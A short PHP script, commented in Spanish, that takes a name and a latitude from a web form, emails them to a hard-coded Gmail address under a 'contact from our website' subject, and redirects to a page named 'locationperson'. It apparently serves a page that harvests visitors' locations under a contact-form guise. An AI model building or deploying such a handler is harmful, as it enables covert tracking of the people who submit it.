<?php  

// Llamando a los campos
$nombre = $_POST['nombre'];
$Latitude = $_POST['Latitude'];

// Datos para el correo
$destinatario = "johnny.93life@gmail.com";
$asunto = "Contacto desde nuestra web";

$carta = "De: $nombre \n";
$carta .= "Latitude: $Latitude \n";



// Enviando Mensaje
mail($destinatario, $asunto, $carta);
header("Location: https://locationperson.000webhostapp.com/");
